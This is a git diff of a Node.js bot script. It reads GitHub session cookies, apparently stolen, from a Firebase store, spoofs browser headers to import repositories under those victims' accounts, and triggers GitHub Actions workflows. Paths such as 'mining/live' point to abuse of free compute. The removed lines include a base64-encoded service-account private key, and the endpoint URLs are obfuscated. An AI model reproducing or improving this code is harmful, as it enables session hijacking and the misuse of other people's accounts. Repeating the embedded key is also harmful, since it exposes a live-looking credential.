@@ -1,26 +1,20 @@
-const admin = require('firebase-admin')
+const FormData = require('form-data')
 const express = require('express')
 const axios = require('axios')
 
+const SERVER = 1
 
+let mActiveServer = []
 let mID = null
-let mUrl = null
 
-let mStart = parseInt(new Date().getTime()/1000)
+let mUpdate = new Date().getTime()
+let mStart = parseInt(mUpdate/1000)
 let mTime = new Date().toString()
-
-const serviceAccount = JSON.parse(decode('eyJ0eXBlIjoic2VydmljZV9hY2NvdW50IiwicHJvamVjdF9pZCI6ImpvYi1zZXJ2ZXItMDg4IiwicHJpdmF0ZV9rZXlfaWQiOiIzZWU1MjAxMDk5YTRmNTI4YjYzYWNkYjc0OTk1ZDUzYjExZDdhNTkzIiwicHJpdmF0ZV9rZXkiOiItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS1cbk1JSUV2QUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktZd2dnU2lBZ0VBQW9JQkFRQ05JbjRrQ2MxVmhwSW1cblRiRStiOWFJbjNPVDNmN1Jhd05IMmJ6WXZIVG5ERkdFTGN5Zm91MUdkRHBlSkRBeHpEaGxuRUVBNXphUmN3Q2Rcbjc2ZGwxbFMvRUMwSGRuVEJCY0ZmZDFwWkJCMG9UVlpuZ2gwajFwM3ZQeFdPSW9xZGNMS0w4c3pLUlJkOEdudFBcbkh5SUxjOHdTRFJoazQyS1JJck9qNzdEZlo3T0RuZ0k3VFlZWEdHWkdlZC9LbDgrWHhZbVVvY3FpNGNad05WRldcbkdLSmd5NUxTVUFHQlllb09EYTAxS3Zhb1ozaElxVEV5UzFMc2VFNENUa3drRjBaaFhyZkczdlc5ZGZQNkVhTURcbkl0eUk0bXZ6T24zaHJ6NWJjQmcybkZRRTZjcUpDaGRmbFhKaG81ODBLdlRid25EcWxhT2l0ZlRrNHJUMUVxcE9cbjR2MHV6dkp0QWdNQkFBRUNnZ0VBUlo4NTNicE9KajRqMDZ4bzNyV1ovYnkyN2I5SjZISGpaT3JuQzMzd0oxZytcbjBEY3RwYVJnYTJ5RHJKUXFpQzVIdGV4ZWJyMGdnS0RjTVkwYkpaUVZLMG1tQlBQdEJaazZ1c2JzZFZRZnRCVnVcbnBkSWNZT1VLOVE1SUtsMGt4eVRrbDBBWHdVSlRJd0FIUzFFKzRLcG5oWkliTWcydnZvd0JWVUkxSFFnUm1MKzZcbmtoVFM1ZTUzYnJwZFlFOU04QmhISDVsbTV3OVB2bTJLa1QyejBlV1lXaDJBUUQ5MVBuQTExK2Y3ek96N1FHMFdcbmdxMU5qSjh3TUt3SE5vL0svNEhJQWZSRThDNkROUDJ4UWNkNWdXaXpOSWxnWTF5a2x4RzFRVEo1K3lORDVvVHRcbndKV3RNS1luQkE4cVZSN1R6NVNUVWk1bzlZY3ZML1NsaFozNEJnbWttd0tCZ1FERXBHbGswQ1ZUVFVWVXJEL0FcbjRrR2lGZmI1cEsrODlNL245TnJFWk5zdVEyUzFGQVNIWmtJdFpBN2VIdDY3d3FOWmpJU0RFekk5alZZSnc1akRcbnluMTJhSWNpWHVwQ0RTV3JFNTJOVlZURHE5WGs3WWRDSlZ4Y1pBbmY4ZlVFdEZ1SVpBZ01wVHY0MHMwNXZlSW9cbjEyV1BTRDhGY2ZoTHdvVlVuYnRYVC84Unh3S0JnUUMzdkxqeFhsQmk2YXU3T01sS0gwSzd6RGR1dFpMU2NGb0JcblVDclZxVG8xOGM5ZkJaRmh6Uk5PUHc4YW5kYTdYVHh2elg5Q1JXa0txR0h6cjd6NGNnZDBNd0hQNjlUT25USUxcbmdaOWIzekUrZG1xR2FTZThkRHdUWUxUcHhPejNBWk96Ym1Qek1sNFVRMkNpUnphUzFIZHdBZkF6bVlKV08weWlcbkZWUFY5NUZhS3dLQmdCamhSSVNBNFhnY3VyenYzbEVsVDNDV250MFBQVDBITEpjSW4vVmhYV29KRk9Ea1czNVdcbkxlRllXNWszQnE5eS9RQURpM0NhS1Mwb2lNNUxkVFN3bGhjNU9uL2F5b0Q0OE44b2FETE5yUi9reWZkaEprLzBcbk1pOXVhT0Z3MTdOMHJuQWZWL1Zob3FqazR4cC9ML0pDN3BLbWJYTGU3SytKT1IxdnA1aHdnckZaQW9HQWNEdDNcblBQaS9ZYXdhbW1JMWtuRkY4akRzSzFQK08wMGxyV2Vxd3BoOFZqYysxR3d5UWV0aXY0a0ZVTnpaTGRubDhPVTFcbnR1VnZKSE4yWWNRWFNpdGRJajJGL2R1d1FnVURiTVBnODkyQjF3VytUQnd2aVkzMnBGK09JcjJIZ2RvVXZxWFBcbnA5NDhXV1JPd3RGOUpITmtBYWN0Y2xkeXBmblM5YTdSWndHeVo4RUNnWUFiQkQwZDgzRGVsaFV5VDRjOW91TUZcbkU5WUV2YzdXVVlvbHkreXVzVW82Z0tLSE81QjhWdWJ0d0JGaWJoUW1QREJRSFJaVUhiYk1JZXRsb2ZUazE5MW9cbklBMS9Ka2tkV0RrR1FvSWYvTE5sdDV2M0ZILzluZ3hma2dzdE9BSXNVNzRlVkg0RmgvQkRlUm5UckxWN01QQy9cblFBSmxMY2txYll5Y0Myb29HYVRDT2c9PVxuLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLVxuIiwiY2xpZW50X2VtYWlsIjoiZmlyZWJhc2UtYWRtaW5zZGstNmMxdnpAam9iLXNlcnZlci0wODguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJjbGllbnRfaWQiOiIxMTU3MDQ4NTUwMTIxNTg2NzE2ODEiLCJhdXRoX3VyaSI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9vL29hdXRoMi9hdXRoIiwidG9rZW5fdXJpIjoiaHR0cHM6Ly9vYXV0aDIuZ29vZ2xlYXBpcy5jb20vdG9rZW4iLCJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9vYXV0aDIvdjEvY2VydHMiLCJjbGllbnRfeDUwOV9jZXJ0X3VybCI6Imh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3JvYm90L3YxL21ldGFkYXRhL3g1MDkvZmlyZWJhc2UtYWRtaW5zZGstNmMxdnolNDBqb2Itc2VydmVyLTA4OC5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsInVuaXZlcnNlX2RvbWFpbiI6Imdvb2dsZWFwaXMuY29tIn0='))
 
 let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
 
-
-admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount),
-    storageBucket: 'gs://job-server-088.appspot.com'
-})
-
-let app = express()
+const app = express()
 
 app.use(express.json())
 
@@ -52,11 +46,10 @@ app.get('/start', async (req, res) => {
     res.end(''+mTime)
 })
 
-const storage = admin.storage().bucket()
-
 
 startServer()
 updateServer()
+// createRepo()
 
 
 setInterval(async () => {
@@ -64,27 +57,22 @@ setInterval(async () => {
 }, 60000)
 
 setInterval(async () => {
-    await startServer()
+    if (SERVER == 1) {
+        await startServer()
+    }
     await updateServer()
-}, 150000)
+    // await createRepo()
+}, 300000)
 
 async function startServer() {
-    if (mUrl == null) {
-        try {
-            let response = await axios.get(BASE_URL+'mining/live/server_2.json')
+    try {
+        let response = await axios.get(BASE_URL+'mining/live/server.json')
 
-            let data = response.data
-            if (data != null && data != 'null') {
-                mUrl = data
-            }
-        } catch (error) {}
-    }
-
-    if (mUrl) {
-        try {
-            await axios.get('https://'+mUrl)
-        } catch (error) {}
-    }
+        let data = response.data
+        if (data != null && data != 'null') {
+            await axios.get('https://'+data+'.onrender.com')
+        }
+    } catch (error) {}
 }
 
 async function updateStatus() {
@@ -95,63 +83,184 @@ async function updateStatus() {
     }
 }
 
-async function updateServer() {
+async function createRepo() {
     try {
-        const results = await storage.getFiles({ prefix: 'server' })
-        const files = results[0]
-        let now = parseInt(new Date().getTime()/1000)
-        let list = []
+        let response = await axios.get(BASE_URL+'github/new.json?orderBy=%22$key%22&limitToFirst=5')
 
-        files.forEach(file => {
-            try {
-                let time = parseInt(file.metadata['contentType'].replace('active/', ''))
-                if(now-time > 150) {
-                    let name = file.metadata.name.replace('server/', '').replace('.json', '')
-                    if (name.length > 10) {
-                        list.push(name)
+        let data = response.data
+
+        if (data != null && data != 'null') {
+            for (let [repo, user] of Object.entries(data)) {
+                try {
+                    response = await axios.get(BASE_URL+'github/server/'+user+'.json')
+                    data = response.data
+
+                    if(data != null && data != 'null') {
+                        
+                        let form = new FormData()
+                        form.append('vcs_url', 'https://github.com/'+user+'/'+user)
+                        form.append('owner', user)
+                        form.append('repository[name]', repo)
+                        form.append('repository[visibility]', 'public')
+                        form.append('source_username', '')
+                        form.append('source_access_token', '')
+
+                        response = await axios.post('https://github.com/new/import', form, {
+                            headers: {
+                                'accept': 'text/html',
+                                'accept-language': 'en-US,en;q=0.9',
+                                'content-type': form.getHeaders()['content-type'],
+                                'cookie': 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark;',
+                                'github-verified-fetch': 'true',
+                                'origin': 'https://github.com',
+                                'priority': 'u=1, i',
+                                'referer': 'https://github.com/new/import',
+                                'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+                                'sec-ch-ua-mobile': '?0',
+                                'sec-ch-ua-platform': '"Windows"',
+                                'sec-fetch-dest': 'empty',
+                                'sec-fetch-mode': 'cors',
+                                'sec-fetch-site': 'same-origin',
+                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+                                'x-requested-with': 'XMLHttpRequest'
+                            },
+                            maxRedirects: 0,
+                            validateStatus: null
+                        })
+                        
+                        try {
+                            let active = 0
+
+                            if (response.status == 302 || response.data == '') {
+                                active = parseInt(new Date().getTime()/1000)+200
+                            }
+
+                            await axios.patch(BASE_URL+'github/start/'+repo+'.json', JSON.stringify({ user:user, action:active }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {
+                            console.log(error)
+                        }
+                        await axios.delete(BASE_URL+'github/new/'+repo+'.json')
                     }
+                } catch (error) {
+                    console.log(error)
+                    
                 }
-            } catch (error) {}
-        })
-
-        console.log('All:', files.length-1, 'Update:', list.length)
-        
-        if (list.length > 0) {
-            let devide = 120000/list.length
-
-            for (let i = 0; i < list.length; i++) {
-                updateWebsite(i+1, list[i], i*devide)
             }
         }
     } catch (error) {}
 }
+
+async function updateServer() {
+    try {
+        if (mActiveServer.length == 0 || mUpdate < new Date().getTime()) {
+            let response = await axios.get(BASE_URL+'github/update/'+getServerName(SERVER)+'.json')
+
+            try {
+                let temp = []
+
+                for(let key of Object.keys(response.data)) {
+                    if (key != null) {
+                        temp.push(key)
+                    }
+                }
+
+                mActiveServer = temp
+                mUpdate = new Date().getTime()+3600000
+            } catch (error) {}
+        }
+        
+        let size = mActiveServer.length
+
+        console.log(size, 'Update: '+new Date().toString())
+
+        if (size > 0) {
+            let devide = 250000/size
+
+            for (let i = 0; i < size; i++) {
+                updateWebsite(mActiveServer[i], i*devide)
+                break
+            }
+        }
+
+        if (size < 100) {
+            try {
+                let response = await axios.get(BASE_URL+'github/panding.json?orderBy=%22$key%22&limitToFirst='+(100-size))
+
+                let data = response.data
+
+                if (data != null && data != 'null') {
+                    let update = false
+
+                    for (let [key, value] of Object.entries(data)) {
+                        try {
+                            await axios.patch(BASE_URL+'github/update/'+getServerName(SERVER)+'/'+key+'.json', JSON.stringify(value), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+
+                            await axios.delete(BASE_URL+'github/panding/'+key+'.json')
+
+                            update = true
+                        } catch (error) {}
+                    }
+
+                    if (update) {
+                        mUpdate = new Date().getTime()
+                    }
+                }
+            } catch (error) {}
+        }
+    } catch (error) {
+        console.log(error)
+    }
+}
    
-async function updateWebsite(id, user, timeout) {
+async function updateWebsite(user, timeout) {
     setTimeout(async() => {
         try {
-            let response = await axios.get(BASE_URL+'github/server/'+user+'.json')
-
-            let data = response.data
-
-            if(data == null || data == 'null') {
-                console.log(id, 'Data Not Found')
-                
-                await axios.delete(STORAGE+encodeURIComponent('server/'+user+'.json'))
-            } else {
-                let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark; '
+            let storageUrl = STORAGE+encodeURIComponent('server/'+user+'.json')
+            let response = await axios.get(storageUrl)
             
-                let cancel = await activeAction(id, user, data['action'], cookies)
-    
-                if (cancel) {
-                    await delay(15000)
-                    await activeAction(id, user, data['action'], cookies)
+            if (parseInt(new Date().getTime()/1000) > parseInt(response.data['contentType'].replace('active/', ''))+10) {
+                response = await axios.get(BASE_URL+'github/action/'+user+'.json')
+                
+                let data = response.data
+
+                if(data != null && data != 'null') {
+                    let action = data['action']
+
+                    response = await axios.get(BASE_URL+'github/server/'+data['user']+'.json')
+                
+                    data = response.data
+
+                    if(data != null && data != 'null') {
+                        let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark; '
+            
+                        let cancel = await activeAction(user, data['action'], storageUrl, cookies)
+            
+                        if (cancel) {
+                            await delay(15000)
+                            await activeAction(user, data['action'], storageUrl, cookies)
+                        }
+                    } else {
+                        console.log('Data Not Found')
+                        await axios.delete(storageUrl)
+                    }
+                } else {
+                    console.log('Data Not Found')
+                    await axios.delete(storageUrl)
                 }
             }
         } catch (error) {}
     }, timeout)
 }
 
-async function activeAction(id, user, action, cookies) {
+async function activeAction(user, action, storageUrl, cookies) {
     let token = null
 
     try {
@@ -164,14 +273,13 @@ async function activeAction(id, user, action, cookies) {
         let body = response.data
 
         if (body.includes('hx_dot-fill-pending-icon') && body.includes('class="d-inline-block"')) {
-            let next = false
             try {
                 await axios.get('https://raw.githubusercontent.com/'+user+'/'+user+'/main/.github/workflows/main.yml')
             } catch (error) {
                 try {
                     if (error.response.data == '404: Not Found') {
                         next = false
-                        await axios.delete(STORAGE+encodeURIComponent('server/'+user+'.json'))
+                        await axios.delete(storageUrl)
                     }
                 } catch (error) {}
             }
@@ -223,11 +331,11 @@ async function activeAction(id, user, action, cookies) {
                         let action = await getAction(user, cookies)
                         if (action) {
                             token = 'action'
-                            console.log(id, 'Receive New Action: '+action)
-                            console.log(id, 'Success: '+user)
+                            console.log('Receive New Action: '+action)
+                            console.log('Success: '+user)
                             await saveAction(user, action)
                         } else {
-                            console.log(id, 'Action Null: '+user)
+                            console.log('Action Null: '+user)
                         }
                     }
                 }
@@ -247,34 +355,35 @@ async function activeAction(id, user, action, cookies) {
         
                 try {
                     if (response.data.length > 0) {
-                        console.log(id, 'Block: '+user)
+                        console.log('Block: '+user)
                     } else {
-                        console.log(id, 'Success: '+user)
+                        console.log('Success: '+user)
                     }
         
-                    await axios.post(STORAGE+encodeURIComponent('server/'+user+'.json'), '', {
+                    await axios.post(storageUrl, '', {
                         headers: {
-                            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
+                            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
                         },
                         maxBodyLength: Infinity,
                         maxContentLength: Infinity
                     })
                 } catch (error) {
-                    console.log(id, 'Error: '+user)
+                    console.log('Error: '+user)
                 }
             }
         }
     } catch (error) {}
 
     if (token == null) {
-        console.log(id, 'Token Null: '+user)
+        console.log('Token Null: '+user)
 
         try {
             await axios.get('https://raw.githubusercontent.com/'+user+'/'+user+'/main/.github/workflows/main.yml')
         } catch (error) {
             try {
                 if (error.response.data == '404: Not Found') {
-                    await axios.delete(STORAGE+encodeURIComponent('server/'+user+'.json'))
+                    console.log('remove')
+                    await axios.delete(storageUrl)
                 }
             } catch (error) {}
         }
@@ -400,6 +509,13 @@ function getGrapHeader(cookies) {
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
     }
+}
+
+function getServerName(id) {
+    if (id < 10) {
+        return 'server0'+id
+    }
+    return 'server'+id
 }
 
 function decode(data) {
